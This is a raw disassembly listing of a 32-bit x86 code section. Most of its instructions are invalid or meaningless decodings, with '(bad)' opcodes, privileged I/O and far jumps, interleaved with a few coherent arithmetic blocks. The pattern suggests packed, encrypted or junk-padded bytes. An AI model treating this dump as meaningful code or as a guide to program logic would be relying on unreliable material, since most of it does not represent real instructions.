  40414a:	test   DWORD PTR [edi-0x32],ecx
  40414d:	adc    DWORD PTR [edx],eax
  40414f:	loopne 0x4040ed
  404151:	adc    edx,ecx
  404153:	jle    0x404171
  404155:	push   edx
  404156:	stos   DWORD PTR es:[edi],eax
  404157:	jne    0x4041ce
  404159:	popa   
  40415a:	mov    WORD PTR ds:0x7a23bf97,ss
  404160:	push   edx
  404161:	aaa    
  404162:	mov    cl,0xf0
  404164:	and    ebp,ebp
  404166:	sub    ebx,edi
  404168:	cmp    ebx,edx
  40416a:	mov    edx,DWORD PTR [ebp-0x38]
  40416d:	jbe    0x404176
  404173:	mov    edx,DWORD PTR [ebp-0x3c]
  404176:	mov    edi,DWORD PTR [ebp-0x4]
  404179:	jmp    0x40447c
  40417e:	mov    al,0x3b
  404180:	aaa    
  404181:	or     BYTE PTR [ebp-0x10],dh
  404184:	mov    cl,0x63
  404186:	sub    DWORD PTR [edi],0xffffffd4
  404189:	xor    BYTE PTR [ebp+0x62],dh
  40418c:	leave  
  40418d:	std    
  40418e:	je     0x4041ad
  404190:	jle    0x404210
  404192:	pop    eax
  404193:	jl     0x404213
  404195:	jle    0x404190
  404197:	test   al,0xcf
  404199:	or     eax,0xbdbdec31
  40419e:	jmp    0x404147
  4041a0:	xchg   DWORD PTR [edi+0x72],esp
  4041a3:	mov    edx,0x9871c275
  4041a8:	pop    edx
  4041a9:	stc    
  4041aa:	pusha  
  4041ab:	add    al,0x1f
  4041ad:	popa   
  4041ae:	cmp    al,0x76
  4041b0:	or     eax,0xb4fb0289
  4041b5:	xchg   ecx,eax
  4041b6:	push   edx
  4041b7:	jno    0x404157
  4041b9:	mov    eax,0x77971669
  4041be:	imul   eax,DWORD PTR [edi-0x578f99a],0x23204982
  4041c8:	mov    ds:0x1918d675,eax
  4041cd:	mov    edx,0xadfc8c44
  4041d2:	xchg   DWORD PTR [edx],eax
  4041d4:	in     al,dx
  4041d5:	pop    ds
  4041d6:	sub    DWORD PTR [eax],0xffffffcf
  4041d9:	pop    eax
  4041da:	push   ss
  4041db:	sbb    al,0x39
  4041dd:	cmc    
  4041de:	loope  0x4041c6
  4041e0:	mov    esp,0xfbca59f1
  4041e5:	cwde   
  4041e6:	push   edx
  4041e7:	mov    ah,0xc2
  4041e9:	mov    edx,DWORD PTR [ebp+0x235c4669]
  4041ef:	call   0x2b6c:0x7b110781
  4041f6:	(bad)  [eax-0x6cba5214]
  4041fc:	push   ss
  4041fd:	in     al,dx
  4041fe:	aam    0x61
  404200:	mov    esp,0x37c8cfee
  404205:	dec    ebp
  404206:	in     eax,dx
  404207:	arpl   cx,bx
  404209:	xchg   edx,eax
  40420a:	and    cl,BYTE PTR [edi+0x525b8382]
  404210:	mov    al,ds:0xf24e3d09
  404215:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404216:	sub    ebx,eax
  404218:	adc    DWORD PTR ds:0xdf9e8185,ecx
  40421e:	cmp    DWORD PTR [esi+0x5bd63d92],ebx
  404224:	jg     0x404234
  404226:	mov    DWORD PTR [ebp+0x7d2f028a],ebp
  40422c:	xor    DWORD PTR [edi+0x53],ecx
  40422f:	sub    edx,DWORD PTR [ebp-0x30]
  404232:	popa   
  404233:	dec    ebx
  404234:	loop   0x4041d2
  404236:	cli    
  404237:	cmp    al,0xc3
  404239:	jb     0x404298
  40423b:	push   cs
  40423c:	adc    DWORD PTR [ebx-0x4df63b04],0x679ecf91
  404246:	jg     0x404263
  404248:	popa   
  404249:	mov    dh,0xb
  40424b:	push   es
  40424c:	pushf  
  40424d:	mov    edx,0x400132cc
  404252:	cs aaa 
  404254:	mov    WORD PTR [ecx-0x74ddf1a5],?
  40425a:	xor    DWORD PTR [ecx-0x4bd6a477],edx
  404260:	loop   0x40426f
  404262:	xlat   BYTE PTR ds:[ebx]
  404263:	mul    DWORD PTR [esi+0x5c401a5c]
  404269:	push   edi
  40426a:	stc    
  40426b:	int    0x65
  40426d:	mov    dh,0x8c
  40426f:	lods   al,BYTE PTR ds:[esi]
  404270:	add    eax,DWORD PTR [ebx]
  404272:	jg     0x4042cd
  404274:	jns    0x404251
  404276:	fmul   DWORD PTR [ecx]
  404278:	and    al,0x47
  40427a:	dec    ecx
  40427b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40427c:	stos   DWORD PTR es:[edi],eax
  40427d:	mov    bh,0xe2
  40427f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404280:	bound  esi,QWORD PTR [eax-0x7b]
  404283:	add    eax,0x24725ea7
  404288:	mov    eax,ds:0xf1921c53
  40428d:	out    0xe,eax
  40428f:	adc    DWORD PTR [ecx],ecx
  404291:	jnp    0x404231
  404293:	ret    
  404294:	dec    eax
  404295:	in     al,0x5d
  404297:	jbe    0x40423e
  404299:	mov    ch,0xad
  40429b:	ret    0xbc4a
  40429e:	adc    eax,0x5c874a6b
  4042a3:	xchg   esp,eax
  4042a4:	iret   
  4042a5:	(bad)  
  4042a6:	adc    cl,BYTE PTR [ecx+0x36a76efc]
  4042ac:	sub    dl,dh
  4042ae:	pop    edi
  4042af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042b0:	xlat   BYTE PTR ds:[ebx]
  4042b1:	push   ds
  4042b2:	push   edi
  4042b3:	jle    0x40425e
  4042b5:	stc    
  4042b6:	imul   eax,DWORD PTR [ecx],0xffffffb1
  4042b9:	bound  esi,QWORD PTR [edi+0x60]
  4042bc:	add    esi,DWORD PTR [ebx+0x71]
  4042bf:	outs   dx,BYTE PTR ds:[esi]
  4042c0:	jo     0x404264
  4042c2:	jns    0x404341
  4042c4:	pushf  
  4042c5:	mov    ds:0x712d7c7e,eax
  4042ca:	and    al,0xde
  4042cc:	mov    ah,0xa9
  4042ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042cf:	xchg   ebp,eax
  4042d0:	xchg   BYTE PTR [edi-0x1ac908a6],bh
  4042d6:	pop    ecx
  4042d7:	push   ecx
  4042d8:	mov    eax,0x4fdd9237
  4042dd:	sub    BYTE PTR cs:[ebx],cl
  4042e0:	lock jg 0x404344
  4042e3:	sub    eax,0xc60bb7d3
  4042e8:	invd   
  4042ea:	cmp    bl,BYTE PTR [eax]
  4042ec:	jmp    0x48c8:0x2e9907f7
  4042f3:	(bad)  
  4042f4:	pop    edi
  4042f5:	xchg   DWORD PTR [edi+0x34],esp
  4042f8:	iret   
  4042f9:	inc    edx
  4042fa:	add    eax,eax
  4042fc:	imul   ebx,DWORD PTR [esi-0x1],0x0
  404300:	std    
  404301:	scas   eax,DWORD PTR es:[edi]
  404302:	(bad)  
  404303:	pusha  
  404304:	std    
  404305:	sbb    esi,ecx
  404307:	mov    bh,0xb0
  404309:	stos   DWORD PTR es:[edi],eax
  40430a:	aam    0x6e
  40430c:	sub    bl,BYTE PTR [edi-0x17]
  40430f:	fmul   QWORD PTR [ebx]
  404311:	xchg   esp,eax
  404312:	jge    0x404380
  404314:	(bad)
  404318:	imul   ecx,DWORD PTR [ebx+0x61186601],0xffffffa8
  40431f:	mov    dh,0xc2
  404321:	xchg   esi,eax
  404322:	cmp    bh,0x4
  404325:	pop    ss
  404326:	and    ah,BYTE PTR [edi+0x74]
  404329:	or     BYTE PTR [esi],0x89
  40432c:	sub    ecx,ecx
  40432e:	je     0x404332
  404330:	pop    esp
  404331:	je     0x4042c0
  404333:	mov    dl,0xe7
  404335:	add    DWORD PTR [ebp-0x64],eax
  404338:	je     0x4042d3
  40433a:	div    esi
  40433c:	dec    esi
  40433d:	jne    0x4042c8
  40433f:	xor    bl,BYTE PTR ds:0x87fbacee
  404345:	sbb    BYTE PTR [ecx-0x22091f1e],al
  40434b:	pop    edi
  40434c:	or     al,0xcc
  40434e:	xor    DWORD PTR [ebx-0x6a91ca41],ecx
  404354:	(bad)  
  404355:	mov    WORD PTR [edi-0x23c31a31],ax
  40435c:	jns    0x4042f4
  40435e:	adc    eax,0x55a534b4
  404363:	xchg   ebx,eax
  404364:	adc    edx,ecx
  404366:	jg     0x4042f7
  404368:	dec    ebx
  404369:	mov    esp,0xa0427d29
  40436e:	retf   0x7586
  404371:	stc    
  404372:	pop    esp
  404373:	jge    0x40438d
  404375:	rsqrtps xmm0,XMMWORD PTR gs:[ebp-0x2cc42eff]
  40437d:	loope  0x4043bb
  40437f:	jecxz  0x404345
  404381:	test   DWORD PTR [edi+0x6d6e11fc],ecx
  404387:	ret    
  404388:	xchg   edi,edx
  40438a:	jmp    0x4043f1
  40438c:	jo     0x40433f
  40438e:	dec    eax
  40438f:	mov    edi,0xda9a606d
  404394:	xchg   edx,eax
  404395:	in     eax,0x45
  404397:	pusha  
  404398:	not    ecx
  40439a:	adc    eax,0x3a5addc5
  40439f:	aad    0xdd
  4043a1:	(bad)  
  4043a2:	jmp    0xc425:0x9a92c3da
  4043a9:	enter  0x3f0e,0x4
  4043ad:	dec    ebx
  4043ae:	jecxz  0x404393
  4043b0:	hlt    
  4043b1:	pop    esp
  4043b2:	sbb    ebp,ecx
  4043b4:	data16 (bad) 
  4043b6:	scas   eax,DWORD PTR es:[edi]
  4043b7:	add    cl,BYTE PTR [ebx]
  4043b9:	push   ebx
  4043ba:	mov    DWORD PTR [ecx+eax*4],edi
  4043bd:	jecxz  0x40440a
  4043bf:	push   0x5ac993ca
  4043c4:	pop    edx
  4043c5:	in     al,0x35
  4043c7:	call   0x23bb:0x53fb3973
  4043ce:	adc    BYTE PTR [ecx-0x1c7227c4],dh
  4043d4:	push   ds
  4043d5:	mov    ah,0x72
  4043d7:	iret   
  4043d8:	jecxz  0x404364
  4043da:	stos   DWORD PTR es:[edi],eax
  4043db:	pop    es
  4043dc:	aas    
  4043dd:	cdq    
  4043de:	inc    edi
  4043df:	cmp    al,0x55
  4043e1:	pop    esp
  4043e2:	xchg   cl,bh
  4043e4:	sti    
  4043e5:	dec    edi
  4043e6:	dec    ebp
  4043e7:	dec    DWORD PTR [ebx+0x14420ed]
  4043ed:	push   esp
  4043ee:	inc    ecx
  4043ef:	iret   
  4043f0:	jmp    DWORD PTR [ebp-0x7]
  4043f3:	test   edi,eax
  4043f5:	lea    ebp,[ecx]
  4043f7:	add    ah,bh
  4043f9:	or     BYTE PTR [ebp+eax*8-0x78],bh
  4043fd:	or     ch,bl
  4043ff:	aam    0xf4
  404401:	jns    0x404391
  404403:	scas   eax,DWORD PTR es:[edi]
  404404:	mov    ah,0xa
  404406:	(bad)  
  404407:	cmc    
  404408:	push   es
  404409:	cwde   
  40440a:	push   edi
  40440c:	or     esi,DWORD PTR [ebp-0x8da080]
  404412:	pusha  
  404413:	add    dl,dl
  404415:	add    eax,DWORD PTR [ecx+0x41]
  404418:	cvtdq2ps xmm4,XMMWORD PTR [ebx-0x53]
  40441c:	xor    BYTE PTR [eax+0x7a0aa32c],bl
  404422:	rol    BYTE PTR [ebp+0x33],cl
  404425:	arpl   WORD PTR [esi-0x30b3f1a7],si
  40442b:	mov    DWORD PTR [edi],0xb7a697ac
  404431:	sub    al,0x7
  404433:	std    
  404434:	jmp    0x4043f4
  404436:	jmp    DWORD PTR [edx-0x41e5b14e]
  40443c:	ss call 0x7651e61d
  404442:	mov    bh,ah
  404444:	test   al,0x74
  404446:	inc    edi
  404447:	jbe    0x404414
  404449:	jl     0x404461
  40444b:	inc    eax
  40444c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40444d:	and    ecx,ecx
  40444f:	inc    ebx
  404450:	mov    WORD PTR [ebx+0x2f],fs
  404453:	call   0xef4e:0x7caf1f6c
  40445a:	or     DWORD PTR [esi+0x56dc8844],edi
  404460:	sub    DWORD PTR [ebx-0x20],ebp
  404463:	mov    al,ds:0xb9222272
  404468:	aaa    
  404469:	(bad)  
  40446a:	cs (bad) 
  40446c:	dec    edx
  40446d:	dec    esp
  40446e:	(bad)  
  40446f:	adc    eax,0x5b1c2f71
  404474:	iret   
  404475:	repnz mov edx,DWORD PTR [eax]
  404478:	push   edi
  404479:	jmp    0x40445b
  40447b:	jns    0x4044b0
  40447d:	clc    
  40447e:	jmp    0x404781
  404483:	add    bl,BYTE PTR [ebp+0x44]
  404486:	dec    ecx
  404487:	popa   
  404488:	jno    0x40449d
  40448a:	jne    0x4044e2
  40448c:	xor    al,0xa0
  40448e:	jle    0x404467
  404490:	imul   esp,edx,0xfffffffa
  404493:	pop    esi
  404494:	sbb    BYTE PTR [esi+0x7e],bh
  404497:	pop    eax
  404498:	jl     0x404518
  40449a:	jle    0x4044b8
  40449c:	in     eax,0xe7
  40449e:	pusha  
  40449f:	cld    
  4044a0:	adc    BYTE PTR [eax],0x9c
  4044a3:	dec    ecx
  4044a4:	sub    esi,eax
  4044a6:	adc    dl,BYTE PTR [ecx-0x42]
  4044a9:	push   ds
  4044aa:	cdq    
  4044ab:	push   0xffffff81
  4044ad:	jecxz  0x4044ef
  4044af:	cmp    ecx,DWORD PTR [esi-0x3a]
  4044b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044b3:	sbb    bh,bl
  4044b5:	lahf   
  4044b6:	mov    ?,esi
  4044b8:	sub    DWORD PTR [ebx-0x2e625084],esp
  4044be:	les    ecx,FWORD PTR [edi]
  4044c0:	inc    ebp
  4044c1:	xlat   BYTE PTR ds:[ebx]
  4044c2:	adc    al,BYTE PTR [edx+0x13f7722a]
  4044c8:	pop    ds
  4044c9:	pop    eax
  4044ca:	and    DWORD PTR [ecx+0x3],edi
  4044cd:	fwait
  4044ce:	ins    DWORD PTR es:[edi],dx
  4044cf:	pop    ds
  4044d0:	xacquire xchg BYTE PTR [eax-0x19b88b25],dh
  4044d7:	cs inc ebx
  4044d9:	sbb    eax,0x2538c0fd
  4044de:	imul   ebp,DWORD PTR [ecx-0x64],0xffffffd2
  4044e2:	(bad)  
  4044e3:	cs pop ecx
  4044e5:	mov    eax,ds:0x77ed5465
  4044ea:	pop    ebp
  4044eb:	or     al,0xad
  4044ed:	sub    ebx,DWORD PTR [ebp-0x432fcae7]
  4044f3:	mov    al,BYTE PTR [ebx+0x38]
  4044f6:	data16 out 0x24,al
  4044f9:	inc    esp
  4044fa:	inc    ecx
  4044fb:	inc    ebp
  4044fc:	mov    dh,0x7e
  4044fe:	hlt    
  4044ff:	jg     0x4044a2
  404501:	xchg   edi,eax
  404502:	mov    bh,0x5b
  404504:	xchg   BYTE PTR [ebp+0x31f67da2],cl
  40450a:	mov    al,0xb0
  40450c:	(bad)
  404510:	and    BYTE PTR [esi+ecx*4+0x1e],0xa9
  404515:	lahf   
  404516:	push   esp
  404517:	fdiv   QWORD PTR [esi]
  404519:	push   esp
  40451a:	add    BYTE PTR [ecx-0x5f],0x44
  40451e:	lahf   
  40451f:	pop    edi
  404520:	(bad)  
  404521:	sbb    ch,BYTE PTR [eax+0x35ef854a]
  404527:	xor    eax,0x292fe85a
  40452c:	mov    ds:0x664e9a84,eax
  404531:	xor    BYTE PTR [ecx+0x2b2b7a5],bh
  404537:	in     eax,0x6d
  404539:	fnstenv [ebx+edx*8]
  40453c:	or     DWORD PTR [ebp+0x14],ebx
  40453f:	sbb    eax,0xde63164a
  404544:	cmp    al,0x55
  404546:	mov    bh,0x9b
  404548:	add    BYTE PTR [ebx],ah
  40454a:	push   cs
  40454b:	sbb    BYTE PTR [edi-0x4a],0xb0
  40454f:	ins    DWORD PTR es:[edi],dx
  404550:	adc    eax,0x1b53bdff
  404555:	push   cs
  404556:	rcl    BYTE PTR [eax+0x2287734e],1
  40455c:	xchg   ebx,eax
  40455d:	inc    ebx
  40455e:	push   0xffffffa3
  404560:	pop    edi
  404561:	in     al,0xeb
  404563:	push   edi
  404564:	push   cs
  404565:	add    DWORD PTR [edx-0x45fa2d0f],edx
  40456b:	inc    edx
  40456c:	jp     0x404517
  40456e:	in     eax,dx
  40456f:	push   0x29
  404571:	mov    ebp,ebp
  404573:	xchg   edi,eax
  404574:	xchg   esi,eax
  404575:	mov    dh,0xc3
  404577:	(bad)  
  404578:	ficomp WORD PTR [ecx-0x7]
  40457b:	jo     0x40451f
  40457d:	fiadd  WORD PTR [ebx]
  40457f:	add    edx,DWORD PTR [edi+0x12]
  404582:	inc    ebp
  404583:	sbb    DWORD PTR [esp+ebx*2-0x1906c737],eax
  40458a:	dec    ebp
  40458b:	fsub   QWORD PTR [ebx+0x52d5a812]
  404592:	fadd   DWORD PTR [ecx]
  404594:	addr16 ror eax,cl
  404597:	fimul  DWORD PTR [ebp+0x7788388b]
  40459d:	pop    edi
  40459e:	outs   dx,BYTE PTR ds:[esi]
  40459f:	add    bh,BYTE PTR [ecx-0x542bb429]
  4045a5:	adc    esi,edi
  4045a7:	popa   
  4045a8:	push   ebp
  4045a9:	inc    esi
  4045aa:	jno    0x4045bd
  4045ac:	jae    0x404614
  4045ae:	and    edx,DWORD PTR [eax-0x73]
  4045b1:	fnsave [edx+0x519cf93a]
  4045b7:	js     0x404543
  4045b9:	mov    esi,0x5029a367
  4045be:	add    al,ah
  4045c0:	hlt    
  4045c1:	cmp    esp,ecx
  4045c3:	add    ch,al
  4045c5:	mov    bl,0xaa
  4045c7:	cld    
  4045c8:	call   0xbfd5:0xcc177cd1
  4045cf:	jge    0x404595
  4045d1:	pop    ebx
  4045d2:	mov    edx,?
  4045d4:	xchg   esp,eax
  4045d5:	jl     0x4045cb
  4045d7:	ret    0x67b4
  4045da:	aas    
  4045db:	jns    0x4045dd
  4045dd:	(bad)  
  4045de:	xor    esi,DWORD PTR [ebx]
  4045e0:	loope  0x4045d4
  4045e2:	call   0xd95a5185
  4045e7:	push   ss
  4045e8:	add    eax,0x8d12d3ac
  4045ed:	imul   esi,DWORD PTR [eax+edi*4-0x56],0x234b169
  4045f5:	mov    eax,ds:0x36f55647
  4045fa:	mov    eax,0xfb7158ef
  4045ff:	pop    eax
  404600:	pop    ecx
  404601:	jmp    0xb92d:0x212e8921
  404608:	loopne 0x40462c
  40460a:	inc    edx
  40460b:	or     eax,0x2750d6c2
  404610:	test   DWORD PTR [ebp-0x757a1a28],eax
  404616:	jmp    0x34959c19
  40461b:	xchg   edi,eax
  40461c:	pop    ebx
  40461d:	sub    al,0x3a
  40461f:	push   ds
  404620:	mov    edx,0x60ddc687
  404625:	pop    edi
  404626:	in     eax,0x58
  404628:	inc    edi
  404629:	out    0x10,eax
  40462b:	(bad)  
  40462c:	mov    cs,WORD PTR [ecx]
  40462e:	mov    esp,0xc0bc3d
  404633:	leave  
  404634:	xchg   BYTE PTR [ebp+0x6d74602f],ah
  40463a:	ins    BYTE PTR es:[edi],dx
  40463b:	pop    edi
  40463c:	inc    edi
  40463d:	jp     0x404604
  40463f:	nop
  404640:	pushf  
  404641:	enter  0xcd3c,0xa2
  404645:	outs   dx,DWORD PTR ds:[esi]
  404646:	jle    0x4045f7
  404648:	pushf  
  404649:	jp     0x4045fa
  40464b:	in     al,0x16
  40464d:	push   es
  40464e:	xchg   esp,eax
  40464f:	pop    ds
  404650:	mov    bh,0x12
  404652:	inc    eax
  404653:	mov    cs,ebp
  404655:	inc    edi
  404656:	inc    esi
  404657:	cld    
  404658:	int3   
  404659:	push   ebx
  40465a:	pop    ebp
  40465b:	sub    DWORD PTR [edx],ebx
  40465d:	or     al,0x70
  40465f:	in     al,0x50
  404661:	pop    edx
  404662:	pop    eax
  404663:	mov    BYTE PTR [edi-0x11ac6833],ah
  404669:	or     bl,BYTE PTR [eax-0x242a63dc]
  40466f:	(bad)  
  404670:	or     eax,0x31c62c67
  404675:	sbb    esi,DWORD PTR [esi-0x41]
  404678:	mov    edx,0x56e7938b
  40467d:	mov    dh,0xf6
  40467f:	retf   0xadc7
  404682:	hlt    
  404683:	lea    edi,[ecx-0x6e]
  404686:	xchg   ebp,eax
  404687:	stc    
  404688:	ret    0x346b
  40468b:	inc    esp
  40468c:	sub    edx,DWORD PTR [ecx+0x32]
  40468f:	retf   0xefed
  404692:	leave  
  404693:	jns    0x404643
  404695:	mov    bl,0x7c
  404697:	push   edi
  404698:	mov    ds:0x1cf1a91,al
  40469d:	repz int 0xc4
  4046a0:	imul   esi,DWORD PTR [eax],0x7
  4046a3:	bound  esi,QWORD PTR [edi-0x44]
  4046a6:	jae    0x40470f
  4046a8:	inc    esi
  4046a9:	das    
  4046aa:	xor    ecx,DWORD PTR [edx]
  4046ac:	imul   BYTE PTR [ebx]
  4046ae:	pop    esp
  4046af:	jmp    0xf0ef8638
  4046b4:	xor    edx,DWORD PTR [ebx]
  4046b6:	in     al,0xe5
  4046b8:	sti    
  4046b9:	ss call 0x60ceea67
  4046bf:	or     cl,BYTE PTR [edi+0x42]
  4046c2:	ss ss into 
  4046c5:	scas   al,BYTE PTR es:[edi]
  4046c6:	pop    ebp
  4046c7:	mov    cl,0x61
  4046c9:	jmp    0x404671
  4046cb:	sub    al,BYTE PTR [edx]
  4046cd:	(bad)  
  4046ce:	pop    esp
  4046cf:	xor    al,0x29
  4046d1:	pop    eax
  4046d2:	popf   
  4046d3:	out    0x6c,al
  4046d5:	aaa    
  4046d6:	loopne 0x40468e
  4046d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046d9:	cmc    
  4046da:	cmp    DWORD PTR [eax],eax
  4046dc:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046de:	or     ebx,edi
  4046e0:	out    dx,al
  4046e1:	(bad)  
  4046e2:	mov    al,BYTE PTR [ebx+0x5cceed81]
  4046e8:	(bad)  
  4046e9:	fsubr  DWORD PTR [ecx+0x58]
  4046ec:	out    dx,eax
  4046ed:	pop    edx
  4046ee:	adc    DWORD PTR [edi],0xffffff86
  4046f1:	sub    DWORD PTR [edi],0x8004b6a2
  4046f7:	test   BYTE PTR [ebx],bl
  4046f9:	push   eax
  4046fa:	pop    ebx
  4046fb:	or     eax,0xf54d8d6e
  404700:	cmp    ecx,DWORD PTR [esi+0x19]
  404703:	sbb    edi,0x34
  404706:	and    al,0x82
  404708:	dec    DWORD PTR [ebx]
  40470a:	daa    
  40470b:	dec    edx
  40470c:	fld    QWORD PTR [edi-0x7a5e98db]
  404712:	jmp    0x209cad03
  404717:	pop    esp
  404718:	dec    edi
  404719:	dec    eax
  40471a:	jno    0x404725
  40471c:	stc    
  40471d:	sub    dl,bh
  40471f:	popf   
  404720:	cmc    
  404721:	adc    esi,DWORD PTR [ebp-0x7045ecbd]
  404727:	or     al,0xe8
  404729:	dec    edx
  40472a:	jno    0x4046b4
  40472c:	jmp    0xd8fe:0xc8ca9a57
  404733:	jmp    0x2ead5c78
  404738:	std    
  404739:	scas   al,BYTE PTR es:[edi]
  40473a:	rcl    BYTE PTR [edx+0x61],cl
  40473d:	sbb    ah,cl
  40473f:	jecxz  0x40478f
  404741:	and    bl,BYTE PTR [eax-0x7e906f46]
  404747:	rcl    DWORD PTR [edi],0x9
  40474a:	loope  0x404715
  40474c:	mov    al,ds:0xdee54778
  404751:	test   BYTE PTR [esi+0x3cfea27a],dh
  404757:	mov    ebx,0x83f796b4
  40475c:	push   cs
  40475d:	popa   
  40475e:	and    eax,0x7645180f
  404763:	ins    BYTE PTR es:[edi],dx
  404764:	and    bh,BYTE PTR [esi+0x1ef337c5]
  40476a:	pop    edi
  40476b:	daa    
  40476c:	js     0x404771
  40476e:	pop    ebx
  40476f:	ret    0x80ac
  404772:	jecxz  0x404703
  404774:	or     cl,al
  404776:	fs mov esi,0xdc0d9a44
  40477c:	and    bh,BYTE PTR [edx+ebp*4]
  40477f:	mov    dl,0x0
  404781:	xor    edx,eax
  404783:	add    edi,ecx
  404785:	add    edx,ecx
  404787:	imul   edx,edi
  40478a:	mov    DWORD PTR [ebp+0xc],edx
  40478d:	mov    edx,DWORD PTR [ebp+0xc]
  404790:	mov    DWORD PTR [ebp-0x24],edx
  404793:	mov    edx,DWORD PTR [ebp-0x8]
  404796:	add    edx,DWORD PTR [ebp-0x40]
  404799:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  4047a0:	mov    DWORD PTR [ebp-0x1c],edx
  4047a3:	jmp    0x404aa6
  4047a8:	sub    ch,BYTE PTR [eax+edi*1+0x6b69b8ad]
  4047af:	test   eax,0xf2c2fa45
  4047b4:	jb     0x404773
  4047b6:	sub    bl,bl
  4047b8:	mov    eax,0x587e7e27
  4047bd:	jl     0x40483d
  4047bf:	jle    0x404790
  4047c1:	fcomp  st(7)
  4047c3:	xor    al,0x3b
  4047c5:	int    0x31
  4047c7:	mov    eax,0x77e3ae30
  4047cc:	popa   
  4047cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047ce:	(bad)  
  4047cf:	daa    
  4047d0:	mov    eax,ds:0x88de2770
  4047d5:	rol    BYTE PTR [eax-0x5c],0x74
  4047d9:	jle    0x40481b
  4047db:	jle    0x4047e6
  4047dd:	mov    dl,0x4e
  4047df:	fnstsw WORD PTR [edx]
  4047e1:	mov    edx,0xb481fdbc
  4047e6:	shr    BYTE PTR [edi+0x7b],1
  4047e9:	dec    esp
  4047ea:	xor    DWORD PTR [esi+0x11],0x2c
  4047ee:	(bad)  
  4047ef:	cmp    esp,DWORD PTR [eax+0x55]
  4047f2:	out    0x74,eax
  4047f4:	adc    eax,0xeb9058b7
  4047f9:	lds    esi,FWORD PTR [esi]
  4047fb:	adc    edi,edi
  4047fd:	ins    DWORD PTR es:[edi],dx
  4047fe:	rol    BYTE PTR [ebx],1
  404800:	stc    
  404801:	lods   eax,DWORD PTR ds:[esi]
  404802:	daa    
  404803:	idiv   DWORD PTR [ebx-0x7b5adda6]
  404809:	or     al,0xc8
  40480b:	pop    ebx
  40480c:	cli    
  40480d:	cmp    DWORD PTR [ebp-0x57],ebx
  404810:	mov    esi,?
  404812:	fcom   DWORD PTR [edi]
  404814:	cmc    
  404815:	adc    eax,0xa121279f
  40481a:	or     al,0xc4
  40481c:	pop    ss
  40481d:	xchg   esi,eax
  40481e:	inc    edi
  40481f:	xchg   ecx,eax
  404820:	xor    ecx,DWORD PTR ds:0x268f253f
  404826:	jns    0x4047d6
  404828:	dec    ebp
  404829:	or     ch,BYTE PTR [ecx-0x38]
  40482c:	not    al
  40482e:	repz and bl,al
  404831:	xchg   ebp,eax
  404832:	and    eax,0x903ea044
  404837:	dec    ebx
  404838:	bound  ebp,QWORD PTR [eax-0x1e]
  40483b:	data16 adc BYTE PTR [eax+0x45110b00],ah
  404842:	add    BYTE PTR [esi+0x186548db],0xc2
  404849:	pop    ecx
  40484a:	mov    BYTE PTR [esi-0x13],ah
  40484d:	rol    BYTE PTR [edi],0x96
  404850:	stos   DWORD PTR es:[edi],eax
  404851:	add    DWORD PTR [ebx+0x4e],edi
  404854:	imul   ebx,DWORD PTR [eax],0xde5a0916
  40485a:	or     DWORD PTR [edi+0x52],esi
  40485d:	sub    esp,DWORD PTR [ebp-0x35a20b2e]
  404863:	sbb    al,0xb2
  404865:	mov    eax,0x2dc95eee
  40486a:	mov    dl,0x15
  40486c:	push   esi
  40486d:	xor    ebx,ebx
  40486f:	mov    dl,al
  404871:	jbe    0x40480f
  404873:	sub    eax,0x111c873f
  404878:	mov    ebp,ebp
  40487a:	gs mov esp,0x7e09aecd
  404880:	out    dx,al
  404881:	xchg   ebx,eax
  404882:	add    BYTE PTR [esi+esi*1+0x7d],0x2b
  404887:	jne    0x4048d4
  404889:	popf   
  40488a:	jl     0x4048a8
  40488c:	xor    al,0x2
  40488e:	ins    BYTE PTR es:[edi],dx
  40488f:	cmc    
  404890:	push   cs
  404891:	and    DWORD PTR [ebx+ebx*1-0x6f],0xffffffbe
  404896:	mov    esp,0x7a67b8c5
  40489b:	ror    DWORD PTR [edx+eax*1+0x61bda30f],0x12
  4048a3:	mov    cs,edx
  4048a5:	push   edx
  4048a6:	dec    eax
  4048a7:	pcmpeqw mm0,mm2
  4048aa:	dec    edi
  4048ab:	cmc    
  4048ac:	dec    ebx
  4048ad:	fbld   TBYTE PTR [esi+eax*2-0x2d]
  4048b1:	push   esp
  4048b2:	mov    dh,0x1
  4048b4:	mov    ds:0xa452f00f,eax
  4048b9:	pop    es
  4048ba:	je     0x4048c1
  4048bc:	fs xchg ebx,eax
  4048be:	cmp    al,0x29
  4048c0:	stos   DWORD PTR es:[edi],eax
  4048c1:	(bad)  
  4048c2:	(bad)  
  4048c3:	jmp    0x7a4833a9
  4048c8:	jg     0x404948
  4048ca:	mov    al,0xde
  4048cc:	(bad)  
  4048cd:	jmp    0x40493d
  4048cf:	mov    dl,0x37
  4048d1:	aas    
  4048d2:	pop    ds
  4048d3:	fst    QWORD PTR [edi-0x2f]
  4048d6:	(bad)  
  4048d7:	mov    ebp,0xc55ebd19
  4048dc:	xchg   ebp,eax
  4048dd:	clc    
  4048de:	or     al,0x6f
  4048e0:	inc    ebx
  4048e1:	aad    0x98
  4048e3:	xchg   ecx,eax
  4048e4:	xlat   BYTE PTR ds:[ebx]
  4048e5:	dec    eax
  4048e6:	daa    
  4048e7:	xchg   DWORD PTR [eax+0x5],edi
  4048ea:	mov    dl,0xba
  4048ec:	mov    ah,0x26
  4048ee:	out    dx,al
  4048ef:	fisubr DWORD PTR [ebp+0x34]
  4048f2:	xor    al,0x7b
  4048f4:	pop    esp
  4048f5:	fcmovnb st,st(0)
  4048f7:	gs sbb al,0x8e
  4048fa:	sar    esi,cl
  4048fc:	and    bh,dh
  4048fe:	daa    
  4048ff:	mov    ds:0xcc897fbc,eax
  404904:	pop    ss
  404905:	fstp   TBYTE PTR [edx-0x3a640d12]
  40490b:	xchg   esi,eax
  40490c:	repz push ebx
  40490e:	and    ebp,DWORD PTR [esi]
  404910:	std    
  404911:	jp     0x404987
  404913:	push   ecx
  404914:	fnstcw WORD PTR [esi]
  404916:	les    edi,FWORD PTR [ebx-0x2a]
